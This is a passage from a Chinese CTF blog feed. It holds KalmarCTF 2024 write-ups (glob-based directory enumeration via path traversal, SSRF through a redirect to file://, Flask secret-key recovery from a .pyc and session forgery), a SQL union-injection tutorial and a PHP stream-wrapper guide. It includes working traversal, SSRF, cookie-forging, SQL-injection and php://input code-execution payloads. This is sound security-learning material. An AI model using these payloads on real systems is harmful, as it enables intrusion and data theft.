-f 2- | sed &#x27;s/^\s*//g&#x27; | sed &#x27;s/\s*$//g&#x27;);		if [ -z &quot;$header_name&quot; ] || [[ &quot;$header_name&quot; =~ [[:space:]] ]]; then			abort &quot;Invalid header name&quot;;		fi		# If header already exists, add value to comma separated list		if [[ -v request_headers[$header_name] ]]; then			request_headers[$header_name]=&quot;$&#123;request_headers[$header_name]&#125;, $header_value&quot;		else			request_headers[$header_name]=&quot;$header_value&quot;		fi	done	body_length=$&#123;request_headers[&quot;content-length&quot;]:-0&#125;	if [[ ! $body_length =~ ^[0-9]+$ ]]; then		abort &quot;Invalid Content-Length&quot;	fi	read -N $body_length request_body&#125;handle_request() &#123;	# Default: serve from static directory	path=&quot;/app/static$uri&quot;	path_last_character=$(echo -n &quot;$path&quot; | tail -c 1)	if [ &quot;$path_last_character&quot; == &#x27;/&#x27; ]; then		path=&quot;$&#123;path&#125;index.html&quot;	fi	if ! cat &quot;$path&quot; &gt; /dev/null; then		status=&quot;404 Not Found&quot;	else		mime_type=$(file --mime-type -b &quot;$path&quot;)		file_size=$(stat --printf=&quot;%s&quot; &quot;$path&quot;)		response_headers[&quot;Content-Type&quot;]=&quot;$mime_type&quot;		response_headers[&quot;Content-Length&quot;]=&quot;$file_size&quot;	fi	write_headers	cat &quot;$path&quot; 2&gt;&amp;1&#125;receive_requesthandle_request

由于是shell语言这里我想到了一些shell中的一些骚操作例如：
 $&#123;变量名&#125;  #会将变量的值进行拓展出来$(命令)  #会执行（）中的命令`命令`  #会执行` `中的命令

 拓展：shell语言中的部分特性 
              
              特性1：展开按照展开顺序分为：花括号展开（Brace Expansion）：花括号展开可以用来生成一系列具有相似结构的字符串。例如，使用花括号展开可以生成一组文件名或者一组命令参数。示例：$ echo &#123;a,b,c&#125;a b c$ echo file&#123;1..3&#125;.txtfile1.txt file2.txt file3.txt波浪线展开（Tilde Expansion）：波浪线展开用于扩展波浪线后面的特殊字符，通常用于表示用户的主目录路径。示例：$ echo ~/home/username$ echo ~/Documents/home/username/Documents参数，变量，算术展开和命令替换：参数展开用于访问脚本或函数的参数，变量展开用于展开变量的值，算术展开用于进行数学运算，而命令替换用于将命令的输出作为展开结果。示例：$ echo $HOME/home/username$ echo $((2 + 2))4$ echo $(ls)file1.txt file2.txt file3.txt单词分割（Word Splitting）：单词分割用于将字符串按照特定的分隔符进行拆分，常见的分隔符包括空格、制表符和换行符。示例：$ string=&quot;Hello World&quot;$ echo $stringHello World$ for word in $string; do echo $word; doneHelloWorld文件名展开（Filename Expansion）：文件名展开用于匹配文件系统中的文件名模式，常见的通配符包括星号（*）和问号（?）。示例：$ ls *.txtfile1.txt file2.txt file3.txt$ rm file?.txt特性2：单双引号的区别单引号：使用单引号，单引号中的内容一律被视为字符串，不进行转义，无法被扩展，${}、$()、反引号、通配符无法被使用例如：root@ubuntu:/home/ubuntu/Desktop# echo /*/app /bin /boot /cdrom /dev /etc /home /lib /lib32 /lib64 /libx32 /lost+found /media /mnt /opt /proc /root /run /sbin /snap /srv /swapfile /sys /tmp /usr /var#通配符不会展开root@ubuntu:/home/ubuntu/Desktop# echo &#x27;/*&#x27;/*root@ubuntu:/home/ubuntu/Desktop# echo &#x27;$(date)&#x27;$(date)双引号：变量展开：双引号内的变量会被展开，即变量的值会替换变量本身。命令替换：双引号内的命令替换（使用$()或反引号&#96;&#96;）会被执行，其输出会替换命令本身。通配符不会展开：双引号内的通配符（如*、?等）不会被作为通配符处理，而是作为普通字符。转义字符：某些特殊字符（如$、反引号、\）可以通过反斜线进行转义以表示其字面意义。例如：#变量展开root@ubuntu:/home/ubuntu/Desktop# path=&quot;*&quot;root@ubuntu:/home/ubuntu/Desktop# echo &quot;$&#123;path&#125;&quot;*#命令替换root@ubuntu:/home/ubuntu/Desktop# echo &quot;$(date)&quot;2024年 03月 24日 星期日 16:55:37 CST#通配符不会展开root@ubuntu:/home/ubuntu/Desktop# echo &quot;*&quot;*特性3：变量展开后的字符串1.进行变量展开后，通配符不受 展开前单双引号性质的影响​	只要最后使用变量时，最外层不存在&quot;&quot;即可展开例如#test1path=&#x27;*&#x27;path_after=&quot;./*&quot;echo $path_after #变量替换后，最外层也无&quot;&quot;的影响，此时通配符*可被展开#输出结果：./badass_server.sh ./character1.sh ./character2.sh#test2path=&#x27;*&#x27;path_after=&quot;./$path&quot;echo ”$path_after“ #变量替换后，最外层存在&quot;&quot;的影响，通配符无法展开#输出结果： ./*2.进行变量展开后，变量展开、命令替换受最开始赋值时的单双引号影响​	若最开始时使用单引号，无论最后使用变量时，最外层存不存在引号，都无法被展开例如：#test1path=&#x27;$(date)&#x27;path_after=&quot;./$path&quot;echo $path_afterpath_after_after=$path_afterecho $path_after_after# 输出结果：# ./$(date)# ./$(date)#test2data= dateecho $datapath=&#x27;$&#123;data&#125;&#x27;path_after=&quot;./$path&quot;echo $path_afterpath_after_after=$path_afterecho $path_after_after# 输出结果：# Sun Mar 24 21:29:51     2024# ./$&#123;data&#125;# ./$&#123;data&#125;
              
            

但经过尝试，发现无法通过控制$path这个值变为$&#123;&#125;使最后的cat返回命令替换的结果
预想结果（可以通过cat的报错获取信息，如果这种办法可行剩下的只是空格的绕过）：
root@ubuntu:/home/ubuntu/Desktop# url=$(ls)root@ubuntu:/home/ubuntu/Desktop# path=&quot;app/static/$url&quot;root@ubuntu:/home/ubuntu/Desktop# cat &quot;$path&quot;cat: &#x27;app/static/1.sh&#x27;$&#x27;\n&#x27;&#x27;2&#x27;: 没有那个文件或目录

实际结果

 拓展：shell语言中的部分特性 
              
              特性4：read命令处理字符串使用read命令来读取输入的字符串时，所读取的字符串相当于被单引号包围，具有单引号包裹的字符串的特点变量不展开：单引号内的内容都会被当作普通字符串处理，包括变量，它们不会被展开。命令不替换：单引号内的命令不会被执行，即使使用$()或反引号&#96;&#96;。通配符不展开：单引号内的通配符同样不会被展开，被视为普通文本。转义字符不工作：单引号内几乎所有的字符都被视为普通字符，包括反斜线（\），它不具有转义功能。例如：#test1read -d $&#x27;\n&#x27; -a request_linemethod=$&#123;request_line[0]&#125;echo $method#输入：$(ls) $(ls) $(ls)#输出：$(ls)#test2request_line=(&quot;$(ls)&quot; &quot;$(ls)&quot;)method=$&#123;request_line[0]&#125;echo $method#输出：badass_server.sh bash.md
              
            

此时发现我们可控点只剩下$protocol变量
protocol=$(echo -n &quot;$&#123;request_line[2]&#125;&quot; | sed &#x27;s/^\s*//g&#x27; | sed &#x27;s/\s*$//g&#x27;) if [ $protocol != &#x27;HTTP/1.0&#x27; ] &amp;&amp; [ $protocol != &#x27;HTTP/1.1&#x27; ]; then	abort &#x27;Invalid protocol&#x27;fi

逻辑漏洞2：可控原因：$protocol变量由于使用echo命令，是得read读取后的特性消失，使得$protocol可被拓展
当我们尝试修改HTTP/1.1为/*时，发现并没有出现Invalid protocol
 拓展：shell语言中的部分特性 
              
              特性4：[]的返回值在 shell 中，[] 符号通常用于条件测试。如 if [ CONDITION ]; then ... 这样的语句。在这种用法中，[] 是 [ 命令的简写，这实际上是一个指向 test 命令的链接。因此，当你使用 [] 时，实际上是在调用 test 命令来评估一个条件。test 命令（或其等价的 [ 形式）的返回值遵循 shell 命令的通用返回值约定：0：表示测试的条件为真（true）。1：表示测试的条件为假（false）。。&gt;1：如果出现错误，如语法错误或使用了无效的选项，test 命令可能会返回大于 1 的值。比较特别的是，此时即使设置了set -e也不会退出程序
              
            

逻辑漏洞3：将HTTP/1.1替换为/*时，由于通配符展开，最后会出现进行匹配错误，[]返回大于1的结果，&amp;&amp;的两侧结果都是大于0，返回1，因此认为是假，此时这个if条件被判定为假，可以继续执行后面内容的代码
但如果/*匹配到的结果只有一个时，并不会造成匹配错误，而直接返回0，&amp;&amp;的任意一侧结果为0会直接返回0，此时这个if条件被判定为真
启动set -x时的详细信息如下
+ &#x27;[&#x27; badass_server.sh bash.md character1.sh character2.sh file &#x27;!=&#x27; HTTP/1.0 &#x27;]&#x27;./badass_server.sh: line 63: [: too many arguments

注意：此时通配符展开并不能认为这个变量是数组，数组直接使用会利用数组第0个进行匹配，而通配符展开会报错
因此我们可以通过这个点，使用glob通配符[]写入一个已知的字符，不断修改字符，使其最后能匹配到的结果最后有1个以上，页面不出现：Invalid protocol，进行对目录或者文件名的一步一步匹配（用这种方法可以确定名称比已知目录少的目录名）
最初的页面给出了两个目录，需要利用这两个目录，选择一个目录作为已知字符
&lt;a href=&quot;assets/26c3f25922f71af3372ac65a75cd3b11/iceberg.jpg&quot;&gt;	&lt;button&gt;Explore the iceberg&lt;/button&gt;&lt;/a&gt;&lt;!-- &lt;a href=&quot;assets/f200d055a267ae56160198e0fcb47e5f/try_harder.txt&quot;&gt;	&lt;button&gt;Get the flag&lt;/button&gt;&lt;/a&gt; --&gt;

以26c3f25922f71af3372ac65a75cd3b11作为已知字符为例，所以最后的playload的过程为：
GET /../../../../../../etc/passwd /app/static/assets/[29]*GET /../../../../../../etc/passwd /app/static/assets/[29][6d]*GET /../../../../../../etc/passwd /app/static/assets/[29][6d][cf]*........

最后找到隐藏的目录， 9df5256fe48859c91122cb92964dbd66 
估计最后是猜的吧，flag最后的位置是：/app/static/assets/9df5256fe48859c91122cb92964dbd66/flag.txt
修改url为../../../../../app/static/assets/9df5256fe48859c91122cb92964dbd66/flag.txt读出kalmar&#123;17b29adf_bash_web_server_was_a_mistake_374add33&#125;
Is It Down它是否宕机
题目描述
In an increasingly online world it is nice to know, if you are the only one being offline or if everybody else are having offline too.
在一个日益在线化的世界中，了解自己是唯一离线还是其他人也处于离线状态是很重要的。
We present to you: Is it down!
我们向您介绍：它是否宕机！
Rumour has it, that a flag is stored somewhere on this server.
有传言称，一个标志位被存储在这台服务器的某个地方。

前置知识
/proc目录以及子目录的功能及其作用
Python语言及特性
__pycache__文件夹

解题思路同样的这也是一个黑盒测试，看了看页面发现并没有什么提示，可以根据自己的输入的网址进行判断，网址是否在线或者离线

直接抓包然后repeat看看

会发现页面出现了我们输入网页的源代码，相关的漏洞应该就是SSRF
尝试直接使用file:///etc/passwd试试看，发现页面回显出了
&#123;&quot;error&quot;:&quot;Url must start with &#x27;https://&#x27;. We do not want anything insecure here!&quot;,&quot;success&quot;:false&#125;

发现只能使用https://开头的链接（是我应该就在这卡住了）
根据大佬的思路，我们可以尝试一个发生重定向的网址，  无语啦 。。。。。。。。好麻烦，还得自己起个https服务
根据实际的测试发现：

如果输入的链接网页存在任何内容，不会跟随着网页重定向
如果输入的链接网页不存在任何内容，此时会跟随着网页重定向

例如：
我们输入网址的响应包为：
HTTP/1.1 301 Moved PermanentlyServer: nginxDate: Sun, 24 Mar 2024 15:00:50 GMTContent-Type: text/htmlContent-Length: 162Connection: closeLocation: https://t.doruo.cn/14Qqfhjr2&lt;html&gt;&lt;head&gt;&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt;&lt;h1&gt;301 Moved Permanently&lt;/h1&gt;&lt;/center&gt;&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;

此时，不跟随重定向，返回的内容为
&#123;&quot;content&quot;:&quot;&lt;html&gt;\\r\\n&lt;head&gt;&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt;\\r\\n&lt;body bgcolor=\&quot;white\&quot;&gt;\\r\\n&lt;center&gt;&lt;h1&gt;301 Moved Permanently&lt;/h1&gt;&lt;/center&gt;\\r\\n&lt;hr&gt;&lt;center&gt;openresty&lt;/center&gt;\\r\\n&lt;/body&gt;\\r\\n&lt;/html&gt;\\r\\n&quot;,&quot;online&quot;:true,&quot;success&quot;:true&#125;



我们自己起一个后端服务，为了随时更改重定向内容，我们可以设置代码为以下
&lt;?phperror_reporting(0);header(&quot;Location: &quot;.$_GET[&#x27;wells&#x27;]);

此时我们使用这个服务，并输入参数?wells=file:///etc/passwd,发现页面返回出来了passwd的文件内容
&#123;&quot;content&quot;:&quot;root:x:0:0:root:/root:/bin/ash\\n.........&quot;,&quot;online&quot;:true,&quot;success&quot;:true&#125;

此时再次利用/proc目录进行尝试找到后端服务的文件夹位置以及所对应的运行程序
在/proc/1/cmdline尝试读取后端的运行程序的相关信息uwsgi\\x00--ini\\x00/etc/uwsgi/uwsgi-custom.ini\\x00，可以猜到此时的后端应该是flask，然后再顺藤摸瓜进入到/etc/uwsgi/uwsgi-custom.ini读取配置信息：（美化后）
[uwsgi]uid = www-datagid = www-datamaster = trueprocesses = 4http-socket = 0.0.0.0:5000chmod-sock = 664vacuum = truedie-on-term = truewsgi-file = /var/www/keep-dreaming-sonny-boy/app.pycallable = apppythonpath = /usr/local/lib/python3.11/site-packages

比较重要的信息是：wsgi-file = /var/www/keep-dreaming-sonny-boy/app.py，然后继续顺藤摸瓜找到对应的后端文件读出出来，因为经过了json的转化，变得无敌难看，让狗屁通美化一下最后得到
from flask import Flask, request, send_from_directory, session, abortfrom requestlib import fetchfrom config import session_encryption_keyimport subprocess, osdef protect_secrets():    os.unlink(&quot;config.py&quot;)def check_url(url):    if not isinstance(url, str) or len(url) == 0:        return False, &quot;Please provide a regular url!&quot;    if not url.startswith(&quot;https://&quot;) or url.lstrip() != url:        return False, &quot;Url must start with &#x27;https://&#x27;. We do not want anything insecure here!&quot;    return True, &quot;&quot;app = Flask(__name__, static_folder=&#x27;static&#x27;, static_url_path=&#x27;/assets/&#x27;)app.secret_key = session_encryption_keyprint(&quot;Using key: &quot;, app.secret_key)protect_secrets()@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])def home():    return send_from_directory(&#x27;pages&#x27;, &#x27;index.html&#x27;)@app.route(&#x27;/flag&#x27;, methods=[&#x27;GET&#x27;])def healthcheck():    if session.get(&quot;admin&quot;) == True: #        return subprocess.check_output(&quot;/readflag&quot;)    else:        return abort(403)@app.route(&#x27;/check&#x27;, methods=[&#x27;POST&#x27;])def check():    url = request.form.get(&quot;url&quot;)    valid, err = check_url(url)    if not valid:        return &#123;            &#x27;success&#x27;: False,            &#x27;error&#x27;: err        &#125;    if True:        content = fetch(url)        return &#123;            &#x27;success&#x27;: True,            &#x27;online&#x27;: content != None,            &#x27;content&#x27;: content        &#125;if __name__ == &quot;__main__&quot;:    app.run(host=&#x27;0.0.0.0&#x27;, port=10600, debug=False)

但是这里面requestlib库文件是我们安装不了的，尝试直接读取一下requestlib.py查看是不是自己写的库，同样的也是读到了这个文件，经过美化后如下：
from urllib.request import urlopen, HTTPErrorProcessor, build_opener, Requestimport urllibclass NoRedirection(HTTPErrorProcessor):    def http_response(self, request, response):        return response    https_response = http_responseinstall_opener(build_opener(NoRedirection()))def fetch(url, follow_redirects=True):    &#x27;&#x27;&#x27;    Avoid endless redirect loops    &#x27;&#x27;&#x27;    headers = &#123;        &quot;User-Agent&quot;: &quot;requestlib 2.9-alpha&quot;    &#125;    req = Request(url, headers=headers)    with urlopen(req) as res:        redirect_url = res.headers.get(&quot;Location&quot;))        if redirect_url and follow_redirects:            return fetch(redirect_url, follow_redirects=False)        return str(res.read())[2:-1]

漏洞成因在定义的fetch函数中follow_redirects值默认为True，并且跟随响应包中的Location键值进行判断是否存在重定向，重定向的目标是何。但由于只限制了第一次输入的网址为https://,并未进行对重定向的协议进行检查从而造成了SSRF
 如何处理重定向 
              
              注意：如浏览器，powershell中的curl再处理重定向时，无法处理从https://重定向至file://powershell中的curl发生报错浏览器会提示页面错误
              
            

做到这里，关键其实是为造出一个session，其键值存在admin: True,但存有session_encryption_key的config.py再被调用后就被删除了,需要找到如何复原的办法
@app.route(&#x27;/flag&#x27;, methods=[&#x27;GET&#x27;])def healthcheck():    if session.get(&quot;admin&quot;) == True: #        return subprocess.check_output(&quot;/readflag&quot;)    else:        return abort(403)

__pycache__文件夹
在Python工作目录下，如果执行某文件后经常会自动生成一个__pycache__文件夹。__pycache__文件夹正是缓存*.pyc地方。*.pyc文件的命名格式是&lt;module&gt;.&lt;interpreter_version&gt;.pyc。注意，对于被导入（import）的module才会生成对应的*.pyc文件
详细文档可参考：
【Python】__pycache__文件夹是什么东西？ - 知乎 (zhihu.com)
pyhton中__pycache__文件夹的产生与作用_pycache文件夹下的东西是如何产生的-CSDN博客
例子：
以被导入的为config.py文件为例，最后生成在__pycache__文件夹config.cpython-35.pyc，最开始的config为被导入的文件名，cpython代表的是c语言实现的Python解释器，-35代表的是版本为3.5版。

因此，我们可以在__pycache__文件夹中找到config的.pyc文件，再进行逆向
最后测试到路径为：/var/www/keep-dreaming-sonny-boy/__pycache__/config.cpython-311.pyc，里面的内容为：
\\xa7\\r\\r\\n\\x00\\x00\\x00\\x00\\x86\\x84\\xf7e;\\x00\\x00\\x00\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf3\\n\\x00\\x00\\x00\\x97\\x00d\\x00Z\\x00d\\x01S\\x00)\\x02\\xda Rm7GbQJ4uDikyiis6miD7YwsN11rEjfLN)\\x01\\xda\\x16session_encryption_key\\xa9\\x00\\xf3\\x00\\x00\\x00\\x00\\xfa*/var/www/keep-dreaming-sonny-boy/config.py\\xfa\\x08&lt;module&gt;r\\x07\\x00\\x00\\x00\\x01\\x00\\x00\\x00s\\x11\\x00\\x00\\x00\\xf0\\x03\\x01\\x01\\x01\\xd8\\x19;\\xd0\\x00\\x16\\xd0\\x00\\x16\\xd0\\x00\\x16r\\x05\\x00\\x00\\x00

由于转化为json后转义字符\会变成\\,叫狗屁通写一个小小的脚本把以上数据恢复成二进制数据
data_str = &quot;&quot;&quot;\\xa7\\r\\r\\n\\x00\\x00\\x00\\x00\\x86\\x84\\xf7e;\\x00\\x00\\x00\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf3\\n\\x00\\x00\\x00\\x97\\x00d\\x00Z\\x00d\\x01S\\x00)\\x02\\xda Rm7GbQJ4uDikyiis6miD7YwsN11rEjfLN)\\x01\\xda\\x16session_encryption_key\\xa9\\x00\\xf3\\x00\\x00\\x00\\x00\\xfa*/var/www/keep-dreaming-sonny-boy/config.py\\xfa\\x08&lt;module&gt;r\\x07\\x00\\x00\\x00\\x01\\x00\\x00\\x00s\\x11\\x00\\x00\\x00\\xf0\\x03\\x01\\x01\\x01\\xd8\\x19;\\xd0\\x00\\x16\\xd0\\x00\\x16\\xd0\\x00\\x16r\\x05\\x00\\x00\\x00&quot;&quot;&quot;# 将字符串中的转义序列转换为相应的二进制数据binary_data = bytes(data_str, &quot;utf-8&quot;).decode(&quot;unicode_escape&quot;).encode(&quot;latin1&quot;)# 保存到文件with open(&quot;output_binary_data.txt&quot;, &quot;wb&quot;) as file:    file.write(binary_data)

.pyc文件的逆向在网上就很多在线的工具可以进行使用，逆向后得到
#!/usr/bin/env python# visit https://tool.lu/pyc/ for more information# Version: Python 3.11session_encryption_key = &#x27;Rm7GbQJ4uDikyiis6miD7YwsN11rEjfL&#x27;

再使用session伪造工具flask-session-cookie-manager为造出一个session出来，指令为：
python flask_session_cookie_manager3.py encode -s &#x27;Rm7GbQJ4uDikyiis6miD7YwsN11rEjfL&#x27; -t &quot;&#123;&#x27;admin&#x27;:True&#125;&quot;

最后得到伪造的session所对应的cookie为：eyJhZG1pbiI6dHJ1ZX0.ZgBMeg.t2OWSLBvEeZpMPUZNBFFcmsFS-o，手动填入浏览器中，并访问&#x2F;flag

最后得到flag：kalmar&#123;Rem3Mbr_T0_fl0sh!&#125;
 查看Wells的丢人过程 
              
              我想着不是伪造出session最后的结果时运行/readflag这个可执行文件，便尝试读取了一下，转化为二进制，再发给逆向的同学看看能不能找出flag位于哪里命名为什么直接读取出来也确实逆向出来，找到了flag的位置以及名称但出题人也估计想到了这一点，位于flag.txt设置了权限，没法被直接读取出来。。。。。。。跪谢逆向的同学：L0SJ0K
              
            



参考文章：
https://ireland.re/posts/KalmarCTF_2024/

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF-WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入-联合查询(union)注入</title>
    <url>/posts/1145624611/</url>
    <content><![CDATA[联合查询介绍联合查询语句：
select a from b union select c from d where e;

使用条件：页面对查询语句有回显查询数据
注意事项：

使用联合查询注入时,位于union前的语句不要出现查询的结果(后端只选择查询结果第一行的情况，若前一部分可以被查询，则联合查询的部分不会回显)

若前部分有结果，可在每次的union查询后添加语句limit n,1(n根据题目实际进行切换)起到回显联合查询结果的作用
注：limit num1，num2的作用为从第num1行开始显示num2行内容


所需函数1.concat()函数
​	concat()函数：将多个不同字段的字符串连接成一个字符串。
concat(str1，str2) #语法

注意：返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。
2.group_concat()函数
​	group_concat() 将多个同个字段的字符串连接成一个字符串。
group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc] [separator ‘分隔符’]) #语法

注入流程
判断类型链接：SQL注入-基础 | WELLS Blog

字段数联合查询(union)，必选保证union前后两个查询的字段数一致，即两个查询结果有相同的列数，因此要对前一个的字段数进行判断。可以使用order by 数字进行判断
注：order by n表示查询结果通过第n个字段进行排序
使用示例：
id=1&#x27; order by 1 --+

使用时不断增大数字，假设直至第n个出现错误，从而判断出字段数为n-1

回显点知道字段数之后，我们还需要确定在哪个字段是回显到页面上的
直接根据字段数，联合查询数字1，2，3...,以三个字段数为例
id=1&#x27; order by union select 1,2,3 --+

从页面上查找回显的是哪个数字

爆库名、表名，字段名，数据

​	使用union语句在回显位置导出数据库中的数据，结合SQL注入-基础 | WELLS Blog中的SQL注入常用基础语句
以2位置为回显点，爆表名为例
id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF-Web</tag>
        <tag>Web-SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>常见协议与PHP伪协议</title>
    <url>/posts/2344074049/</url>
    <content><![CDATA[常见协议与封装协议1 file:// — 访问本地文件系统2 http:// — 访问 HTTP(s) 网址3 ftp:// — 访问 FTP(s) URLs4 php:// — 访问各个输入/输出流(I/O streams)5 zlib:// — 压缩流6 data:// — 数据(RFC 2397)7 glob:// — 查找匹配的文件路径模式8 phar:// — PHP 归档9 ssh2:// — Secure Shell 210 rar:// — RAR11 ogg:// — 音频流12 expect:// — 处理交互式的流





file:&#x2F;&#x2F;访问本地文件系统，若不加协议名称，默认封装协议为file://协议
条件：

allow_url_fopen:off&#x2F;on
allow_url_include :off&#x2F;on

作用：用于访问本地文件系统（服务器中的文件），在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。
说明：当不说明使用file:&#x2F;&#x2F;协议的时（即默认file:&#x2F;&#x2F;协议的情况）可以使用相对路径，当使用了file协议时无法使用相对路径。
cmd=file://flag #用法错误，声明file协议时无法使用相对路径cmd=file:///flag #用法正确，使用绝对路径cmd=/flag #用法正确，使用绝对路径cmd=flag #用法正确，使用相对路径

相对路径
当指定了一个相对路径提供的路径将基于当前的目录。在很多情况下是脚本所在的目录。

Windows：不以:&#x2F;&#x2F;indows 盘符开头的路径

Linux:不以&#x2F;开头的路径


使用示例：以传参变量名为cmd演示
#Linuxcmd=file:///path/to/flag #根目录下path文件夹中to文件夹下flag文件 ——此处有///三条cmd=/path/to/flag #根目录下path文件夹中to文件夹下flag文件cmd=relative/path/flag #当前目录下relative文件夹中path文件夹下flag文件cmd=flag #当前目录下的flag文件#Windowscmd=file://C:/path/to/flag #C盘中path文件夹中to文件夹下flag文件cmd=file://C:\path\to\flag #C盘中path文件夹中to文件夹下flag文件cmd=C:\path\to\flag #C盘中path文件夹中to文件夹下flag文件cmd=flag  #当前文件夹下flag文件



http:&#x2F;&#x2F; 访问 HTTP(s) 网址
条件：

allow_url_fopen:on
allow_url_include:on

作用：常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。
使用示例：以传参变量名为cmd演示
cmd=http://example.com/phpinfo.txt	#读取http://example.com/phpinfo.txt文件cmd=https://example.com/file.php?var1=val1&amp;var2=val2	#读取https://example.com/file.php文件并且传入var1和var2的值



php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流(I&#x2F;O streams)，伪协议提供了多种不同的方式来访问和处理数据
常见的PHP伪协议：
php://input #这个伪协议用于访问HTTP请求的原始主体数据。它通常用于从POST请求中读取数据。php://output #这个伪协议用于访问HTTP响应的输出流。它通常用于向客户端发送数据。php://stdin #用于访问标准输入流。php://stdout #用于访问标准输出流。php://stderr #用于访问标准错误输出流。php://temp #用于临时存储数据的内存流。它可以用于在没有创建实际文件的情况下处理临时数据。php://memory #用于在内存中创建可读写的数据流。php://filter #这个伪协议用于数据过滤和转换。它允许您将不同的过滤器应用于数据流，例如Base64编码、压缩和加密等。php://globals #用于访问全局变量。可以通过此伪协议查看和修改PHP全局变量的值。php://fd #用于访问文件描述符。它允许您在PHP中访问底层文件系统。

在CTF中经常使用的是php://filter和php://input、php://filter用于读取源码，php://input用于执行POST参数中的php代码。
作用：php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流(I&#x2F;O streams)
条件：

allow_url_fopen:off&#x2F;on
allow_url_include :仅php://input 、php://stdin、php://memory、php://temp 需要on

php:&#x2F;&#x2F;filter条件：

allow_url_fopen:off&#x2F;on
allow_url_include :off&#x2F;on

作用：
php://filter可以作为一个位于原始数据流和最终目标之间的中间流来处理其他流，负责对数据进行处理。（即读取或写入数据之前对其进行修改或过滤。）



名称
描述



resource&#x3D;&lt;要过滤的数据流&gt;
这个参数是必须的。它指定了你要筛选过滤的数据流。（加绝对路径）


read&#x3D;&lt;读链的筛选列表&gt;
read参数指定 一个或多个过滤器 用于读操作，可以设定一个或多个过滤器名称，以管道符分隔。（读取文件后编码输出）


write&#x3D;&lt;写链的筛选列表&gt;
write参数指定 一个或多个过滤器 用于写操作，可以设定一个或多个过滤器名称，以管道符分隔。（编码重写入文件）


&lt;；两个链的筛选列表&gt;
任何没有以 read&#x3D; 或 write&#x3D; 作前缀的筛选器列表会视情况应用于读或写链。


注：

read 和 write 指令是互斥的，不能同时使用。
如果存在多个过滤器，字符串从左到右的顺序经过过滤器

write指令用于写入文件，对字符串编码后写入
&lt;?php/* 将 &quot;Hello World&quot; 进行base64编码然后写入根目录flag.txt文件 */file_put_contents(&quot;php://filter/write=convert.base64-encode/resource=/flag.txt&quot;,&quot;Hello World&quot;);?&gt;

常用过滤语句：
cmd=php://filter/read=convert.base64-encode/resource=/flag //读取根目录flag文件，进行base64编码

常用过滤器
PHP 版本中的过滤器也许比这里列出的更多（或更少），可用 stream_get_filters()来列出 PHP 中已安装的过滤器。
以docker的PHP8.3.4为例，自带的过滤器有

zlib.* 
convert.iconv.*
string.rot13 
string.toupper
string.tolower
convert.* 
dechunk
consumed (目前也不知道是啥)


字符串过滤器
string.rot13（对字符串执行ROT13编码转换）

string.toupper（将字符串转化为大写）

string.tolower（将字符串转化为小写）

string.strip_tags(自 PHP 7.3.0 起废弃，从字符串中去除 HTML 和 PHP 标记)



官方文档：
PHP: 字符串过滤器 - Manual

转换过滤器注：转换过滤器是 PHP 5.0.0 添加的

convert.base64-encode和 convert.base64-decode（将字符串进行base64编码加解密）
convert.quoted-printable-encode 和 convert.quoted-printable-decode（将字符串进行Quoted-printable编码加解密）
Quoted-Printable 编码 - 知乎 (zhihu.com)


convert.iconv.*（将字符串进行字符编码转化）


官方文档：
PHP: 转换过滤器 - Manual

压缩过滤器
压缩过滤器可以在网络的流中提供通用压缩，将一个非压缩的流转换成一个压缩流。可以在任何时候应用于任何流资源。

官方文档：
PHP: 压缩过滤器 - Manual

加密过滤器（已自 PHP 7.1.0 起废弃）
加密过滤器特别适用于文件&#x2F;数据流的加密。

官方文档：
PHP: 加密过滤器 - Manual

dechunk
将HTTP分块Chunk传输的数据进行解码

HTTP分块Chunk传输：
告别等待！HTTP分块Chunk传输让客户端响应更迅速数据即时呈现-腾讯云开发者社区-腾讯云 (tencent.com)

注：比较特别的是，进行解码的数据流每行都有后缀CRLF（即\r\n），否则将得到空字符串
php:&#x2F;&#x2F;input主要用来接收post数据。
条件：

allow_url_fopen:off&#x2F;on
allow_url_include :on

说明：
CTF中文件包含题目里，可以使用php://input协议，将post请求中的数据作为php代码执行。
使用示例：以传参变量名为file演示
[URL部分]?file=php://input[POST DATA部分]&lt;?php phpinfo(); ?&gt;



zlib:&#x2F;&#x2F; 压缩流
条件

allow_url_fopen:off&#x2F;on
allow_url_include :off&#x2F;on

作用
​	zip:// &amp; bzip2:// &amp; zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg、png、gif等等。
注：zlib:// 需要是服务器内的压缩包文件、但不局限于后缀名
示例：
1、 zip:&#x2F;&#x2F;[压缩文件绝对路径]#[压缩文件内的子文件名]
注意：#需要URL编码为%23，传入时不要加上[ ]
压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传目录&#x2F;var&#x2F;www&#x2F;html&#x2F;，以file为文件包含的参数为例：
?file=zip:///var/www/html/phpinfo.jpg#phpinfo.txt

2、compress.bzip2:&#x2F;&#x2F;file.bz2压缩 phpinfo.txt 为 phpinfo.bz2 并上传(同样支持任意后缀名)，并上传目录&#x2F;var&#x2F;www&#x2F;html&#x2F;，以file为文件包含的参数为例：
?file=compress.bzip2:///var/www/html/phpinfo.bz2

